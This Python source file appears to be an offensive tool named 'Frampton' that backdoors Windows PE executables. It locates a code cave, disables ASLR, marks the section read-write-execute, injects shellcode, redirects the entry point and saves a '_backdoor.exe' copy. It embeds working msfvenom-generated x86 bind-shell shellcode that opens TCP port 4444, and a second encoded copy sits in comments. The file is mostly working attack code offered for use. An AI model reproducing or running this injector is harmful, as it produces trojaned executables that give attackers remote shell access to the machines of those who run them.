#!/usr/bin/env python3

import sys
import os
import pefile
import argparse
from colorama import Fore,Style

# CLI Argument Inputs
parser = argparse.ArgumentParser(description='Frampton PE file Injector')
parser.add_argument('--file','-f',
                    help='Filename or path to base template PE file',
                    required=True,
                    dest='file')
parser.add_argument('--shellcode','-s',
                    required=False,
                    dest='shellcode',
                    type=str,
                    help='Enter custom shellcode (optional) - Default: Windows x86 TCP 4444 Bind Shell')
parser.add_argument('--output','-o',
                    help='Filename or path to new destination PE file (optional)',
                    required=False,
                    dest='outfile')
parser.add_argument('--info','-i',
                    help='Only display code cave information - does not inject or modify (optional)',
                    action="store_true",
                    default=False,
                    required=False,
                    dest='info')
args = parser.parse_args()



# Colour Function Defintions
def PrintGreen(text):
    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintBlue(text):
    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintRed(text):
    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)



# ASLR Status Checker / Disabler
def AslrStatus():

    global pe

    # ASLR Check
    dynamicBase = 0x40
    aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040

    # If ASLR is enabled, then disable it and save to new file
    if aslrcheck:
        if (args.info == False):
            print (PrintRed("[!]") + " ASLR: \t\t\tEnabled - Disabling ASLR to " + newFile + "\n")
            pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
            pe.write(newFile)
            return True
        else:
            print(PrintRed("[!]") + " ASLR: \t\t\tEnabled\n")
        #sys.exit(1)

    # Continue without ASLR
    else:
        print (PrintGreen("[+]") + " ASLR: \t\t\tDisabled\n")
        return False

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():

    global aslr
    global pe
    global x64

    # ASLR Check
    aslr = AslrStatus()

    # If ASLR was enabled, open the new file for working
    if aslr:
        filedata = open(newFile, "rb")
        pe = pefile.PE(newFile)

    else:
        filedata = open(file, "rb")

    print(PrintBlue("[i]") + " Min Cave Size: \t\t" + str(4 + len(shellcode)) + " bytes")

    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)

    # Print Number of Section Headers
    print(PrintBlue("[i]") + " Number of Sections: \t" + str(pe.FILE_HEADER.NumberOfSections))

    caveFound = False
    # Loop through sections to identify code cave of minimum bytes
    for section in pe.sections:
        sectionCount = 0

        print(PrintBlue("[i]") + " Checking Section: \t\t" + section.Name.decode())

        if section.SizeOfRawData != 0:
            position = 0
            count = 0

            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData)

            for byte in data:
                position += 1

                if byte == 0x00:
                    count += 1
                else:

                    if count > minCave:
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1

                        print(PrintGreen("[+]") + " Code Cave:")
                        print("\tSection: \t\t%s" % section.Name.decode())
                        print ("\tSize: \t\t\t%d bytes" % count)
                        print ("\tRaw: \t\t\t0x%08X" % raw_addr)
                        print ("\tVirtual: \t\t0x%08X" % vir_addr)
                        print("\tCharacteristics: \t" + hex(section.Characteristics))

                        if (args.info == False and x64 == False):
                            # Set section header characteristics ## RWX
                            section.Characteristics = 0xE0000040
                            print("\tNew Characteristics: \t" + "0xE0000040\n")
                        return vir_addr,raw_addr

                    count = 0
        sectionCount += 1

    if caveFound == False:
        print(PrintRed("[!]") + " No Code Cave Found")

    filedata.close()


# Frampton banner
banner = (
  "\n"
  "_|_|_|_|                                             _|\n"
  "_|       _|  _|_|   _|_|_| _|_|_|  _|_|   _|_|_|   _|_|_|_|   _|_|   _|_|_|\n"
  "_|_|_|   _|_|     _|    _| _|    _|    _| _|    _|   _|     _|    _| _|    _|\n"
  "_|       _|       _|    _| _|    _|    _| _|    _|   _|     _|    _| _|    _|\n"
  "_|       _|         _|_|_| _|    _|    _| _|_|_|       _|_|   _|_|   _|    _|\n"
  "                                          _|\n"
  "                                          _|\n"
)
print (PrintGreen(banner))

# Load file to var
file = args.file

# Load to pefile object
pe = pefile.PE(file)

# Global var for ASLR tracking
aslr = False

# Global var for x64
x64 = False

# msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -f c
# Uses default bind-shell (TCP 4444) if no shellcode input
# shellcode = bytes(
#     b"\xdb\xdb\xbb\xe6\x0e\x55\x48\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
#     b"\x53\x31\x5a\x17\x83\xea\xfc\x03\xbc\x1d\xb7\xbd\xbc\xca\xb5"
#     b"\x3e\x3c\x0b\xda\xb7\xd9\x3a\xda\xac\xaa\x6d\xea\xa7\xfe\x81"
#     b"\x81\xea\xea\x12\xe7\x22\x1d\x92\x42\x15\x10\x23\xfe\x65\x33"
#     b"\xa7\xfd\xb9\x93\x96\xcd\xcf\xd2\xdf\x30\x3d\x86\x88\x3f\x90"
#     b"\x36\xbc\x0a\x29\xbd\x8e\x9b\x29\x22\x46\x9d\x18\xf5\xdc\xc4"
#     b"\xba\xf4\x31\x7d\xf3\xee\x56\xb8\x4d\x85\xad\x36\x4c\x4f\xfc"
#     b"\xb7\xe3\xae\x30\x4a\xfd\xf7\xf7\xb5\x88\x01\x04\x4b\x8b\xd6"
#     b"\x76\x97\x1e\xcc\xd1\x5c\xb8\x28\xe3\xb1\x5f\xbb\xef\x7e\x2b"
#     b"\xe3\xf3\x81\xf8\x98\x08\x09\xff\x4e\x99\x49\x24\x4a\xc1\x0a"
#     b"\x45\xcb\xaf\xfd\x7a\x0b\x10\xa1\xde\x40\xbd\xb6\x52\x0b\xaa"
#     b"\x7b\x5f\xb3\x2a\x14\xe8\xc0\x18\xbb\x42\x4e\x11\x34\x4d\x89"
#     b"\x56\x6f\x29\x05\xa9\x90\x4a\x0c\x6e\xc4\x1a\x26\x47\x65\xf1"
#     b"\xb6\x68\xb0\x6c\xbe\xcf\x6b\x93\x43\xaf\xdb\x13\xeb\x58\x36"
#     b"\x9c\xd4\x79\x39\x76\x7d\x11\xc4\x79\x90\xbe\x41\x9f\xf8\x2e"
#     b"\x04\x37\x94\x8c\x73\x80\x03\xee\x51\xb8\xa3\xa7\xb3\x7f\xcc"
#     b"\x37\x96\xd7\x5a\xbc\xf5\xe3\x7b\xc3\xd3\x43\xec\x54\xa9\x05"
#     b"\x5f\xc4\xae\x0f\x37\x65\x3c\xd4\xc7\xe0\x5d\x43\x90\xa5\x90"
#     b"\x9a\x74\x58\x8a\x34\x6a\xa1\x4a\x7e\x2e\x7e\xaf\x81\xaf\xf3"
#     b"\x8b\xa5\xbf\xcd\x14\xe2\xeb\x81\x42\xbc\x45\x64\x3d\x0e\x3f"
#     b"\x3e\x92\xd8\xd7\xc7\xd8\xda\xa1\xc7\x34\xad\x4d\x79\xe1\xe8"
#     b"\x72\xb6\x65\xfd\x0b\xaa\x15\x02\xc6\x6e\x7f\x39\x0a\xcd\xe8"
#     b"\x64\x5f\x53\x75\x97\x8a\x90\x80\x14\x3e\x69\x77\x04\x4b\x6c"
#     b"\x33\x82\xa0\x1c\x2c\x67\xc6\xb3\x4d\xa2"
#     )

# msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
shellcode = bytes(
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    b"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    b"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    b"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
    b"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
    b"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
    b"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
    b"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
    b"\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
    b"\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
    b"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
    b"\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68"
    b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"
    b"\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
)

# Custom shellcode
if args.shellcode:
    shellcode = b"\x90\x90\x90\x90" + bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)])
else:
    shellcode = b"\x90\x90\x90\x90" + shellcode

if args.outfile:
    newFile = args.outfile
else:
    newFile = args.file.split(".exe")[0] + "_backdoor.exe"

print (PrintBlue("[i]") + " Filename: \t\t\t" + os.path.basename(file))

# Checks if 32 or 64 bit binary
if hex(pe.FILE_HEADER.Machine) == '0x14c':
    print(PrintGreen("[+]") + " Arch: \t\t\t32-bit")
else:
    print(PrintRed("[!]") + " Arch: \t\t\t64-bit")
    minCave = len(shellcode) + 20
    x64 = True
    FindCave()
    if (args.info == False):
        print(PrintRed("[!]") + " Backdoor not injected")
    sys.exit(1)

# Stores Image Base (e.g. 0x400000)
image_base = pe.OPTIONAL_HEADER.ImageBase
print(PrintBlue("[i]") + " Image Base:\t\t\t" + '0x{:08x}'.format(image_base))

# Stores entrypoint as 4 byte hex e.g. 0x0004777f)
entrypoint = '0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
print(PrintBlue("[i]") + " Entry Point:\t\t" + entrypoint)

# Find Code Cave
minCave = len(shellcode) + 20
newEntryPoint,newRawOffset = FindCave()

# Stores original entrypoint
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)

if (args.info == False):
    # Sets new Entry Point and formats based upon whether ASLR was enabled
    if aslr:
        aslr_ep = newEntryPoint - image_base

        if (aslr_ep % 4 == 0):
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
        else:
            aslr_ep = (aslr_ep % 4) + aslr_ep
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep

        print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))

    else:
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = newRawOffset
        print (PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(newRawOffset))

    # Reformat original instruction return address to little endian
    returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

    # Add return address for original program execution
    shellcode += (b"\xB8" + returnAddress + b"\xFF\xD0")

    # Injects Shellcode
    pe.set_bytes_at_offset(newRawOffset, shellcode)

    print (PrintGreen("\n[+]") + " New PE Saved:\t\t" + newFile)

if (args.info == False):
    # Save and close files
    pe.write(newFile)

pe.close()
print ("\n")
